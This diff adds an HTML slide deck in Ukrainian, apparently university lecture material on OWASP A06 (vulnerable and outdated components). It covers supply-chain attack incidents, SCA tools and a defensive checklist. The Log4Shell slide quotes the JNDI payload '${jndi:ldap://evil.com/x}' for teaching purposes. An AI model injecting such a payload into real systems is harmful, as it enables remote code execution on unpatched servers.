@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 8.3 — A06: Вразливі та застарілі компоненти</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="8">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>A06: Вразливі та застарілі компоненти</h1>
+      <div class="subtitle">Тема 8.3 — Безпека веб-додатків: OWASP Top 10 (Частина 2)</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: Проблема -->
+    <section class="slide">
+      <h2>Supply-Chain ризик: масштаб проблеми</h2>
+
+      <div class="two-column" style="margin-top: 1rem;">
+        <div class="column">
+          <div class="card-red">
+            <h3>Статистика (Synopsys OSSRA 2024)</h3>
+            <div style="margin-top: 1rem;">
+              <div class="stat-item" style="margin-bottom: 1rem;">
+                <div style="font-size: 1.8em; font-weight: 700; color: var(--accent);">96%</div>
+                <div style="font-size: 0.85em; opacity: 0.8;">кодових баз містять open-source</div>
+              </div>
+              <div class="stat-item" style="margin-bottom: 1rem;">
+                <div style="font-size: 1.8em; font-weight: 700; color: var(--accent);">84%</div>
+                <div style="font-size: 0.85em; opacity: 0.8;">мають відому вразливість</div>
+              </div>
+              <div class="stat-item">
+                <div style="font-size: 1.8em; font-weight: 700; color: var(--accent);">91%</div>
+                <div style="font-size: 0.85em; opacity: 0.8;">використовують застарілі компоненти</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-purple">
+            <h3>Типи компонентів</h3>
+            <ul style="margin-top: 1rem; font-size: 0.85em; line-height: 1.7;">
+              <li><strong>Бібліотеки</strong> — jQuery, Log4j, OpenSSL</li>
+              <li><strong>Фреймворки</strong> — Spring, Django, Rails</li>
+              <li><strong>Транзитивні</strong> — залежності залежностей</li>
+              <li><strong>Runtime</strong> — Node.js, Python, PHP</li>
+              <li><strong>CMS + плагіни</strong> — WordPress, Drupal</li>
+              <li><strong>Контейнери</strong> — базові Docker images</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <div class="warning-box" style="margin-top: 1.5rem;">
+        <strong>Equifax (2017):</strong> Патч для Apache Struts (CVE-2017-5638, CVSS 10.0) вийшов за 2 місяці до атаки. Результат: витік даних 147 млн осіб, штраф $700 млн.
+      </div>
+    </section>
+
+    <!-- Slide 3: Резонансні інциденти -->
+    <section class="slide">
+      <h2>Резонансні supply-chain атаки</h2>
+
+      <div class="two-column" style="margin-top: 1rem;">
+        <div class="column">
+          <div class="gradient-box gradient-red" style="margin-bottom: 1rem;">
+            <h3>Log4Shell (2021)</h3>
+            <p style="font-size: 0.85em; line-height: 1.5; margin-top: 0.8rem;">
+              <strong>CVE-2021-44228, CVSS 10.0.</strong> RCE через рядок у лозі: <code>${jndi:ldap://evil.com/x}</code>. Тисячі продуктів: Elasticsearch, Minecraft, iCloud.
+            </p>
+          </div>
+
+          <div class="gradient-box gradient-purple">
+            <h3>SolarWinds (2020)</h3>
+            <p style="font-size: 0.85em; line-height: 1.5; margin-top: 0.8rem;">
+              Бекдор SUNBURST у офіційному оновленні Orion Platform. <strong>18 000+ організацій</strong>, включаючи Пентагон.
+            </p>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="gradient-box gradient-blue" style="margin-bottom: 1rem;">
+            <h3>event-stream (2018)</h3>
+            <p style="font-size: 0.85em; line-height: 1.5; margin-top: 0.8rem;">
+              npm-пакет (2M завантажень/тиждень). Зловмисник став maintainer'ом, додав шкідливий код для крадіжки Bitcoin.
+            </p>
+          </div>
+
+          <div class="gradient-box gradient-green">
+            <h3>Dependency Confusion (2021)</h3>
+            <p style="font-size: 0.85em; line-height: 1.5; margin-top: 0.8rem;">
+              Публікація пакетів з назвами внутрішніх у public registry. Вражені: <strong>Microsoft, Apple, PayPal</strong>.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 4: SCA та захист -->
+    <section class="slide">
+      <h2>SCA-інструменти та запобігання</h2>
+
+      <table class="comparison-table" style="margin-top: 1rem; font-size: 0.82em;">
+        <thead>
+          <tr>
+            <th>Інструмент</th>
+            <th>Тип</th>
+            <th>Для чого</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>npm audit</strong></td>
+            <td>Вбудований</td>
+            <td class="cell-blue">Node.js залежності</td>
+          </tr>
+          <tr>
+            <td><strong>Dependabot</strong></td>
+            <td>GitHub</td>
+            <td class="cell-green">Авто-PR з оновленнями</td>
+          </tr>
+          <tr>
+            <td><strong>Snyk</strong></td>
+            <td>SaaS + CLI</td>
+            <td class="cell-green">Multi-lang + CI/CD</td>
+          </tr>
+          <tr>
+            <td><strong>Trivy</strong></td>
+            <td>OSS CLI</td>
+            <td class="cell-blue">Containers + FS</td>
+          </tr>
+          <tr>
+            <td><strong>OWASP Dep-Check</strong></td>
+            <td>CLI/Plugin</td>
+            <td class="cell-yellow">Java, .NET, Node.js</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="success-box" style="margin-top: 1.5rem;">
+        <h3 style="margin-bottom: 0.8rem;">Чек-ліст захисту</h3>
+        <div class="checklist" style="font-size: 0.85em;">
+          <div>Інвентаризація всіх залежностей (включно з транзитивними)</div>
+          <div>Lock-файли + hash verification (<code>npm ci</code>)</div>
+          <div>SBOM (Software Bill of Materials) — CycloneDX / SPDX</div>
+          <div>Автоматичні оновлення (Dependabot, Renovate)</div>
+          <div>Видалення непотрібних залежностей</div>
+          <div>Private registry для контролю пакетів</div>
+        </div>
+      </div>
+    </section>
+
+  </div>
+
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
